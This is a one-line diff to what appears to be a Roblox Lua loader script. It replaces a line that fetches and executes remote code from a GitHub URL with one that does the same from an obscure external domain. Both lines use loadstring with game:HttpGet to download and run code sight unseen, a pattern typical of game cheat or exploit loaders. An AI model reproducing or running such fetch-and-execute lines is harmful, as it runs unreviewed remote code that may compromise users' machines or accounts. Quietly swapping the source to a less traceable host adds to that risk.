@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/3ed81da2df49f6d04d37df97.lua'))()
+loadstring(game:HttpGet("https://egorikusa.space/23a6de56600499561d97f3b8.lua", true))()
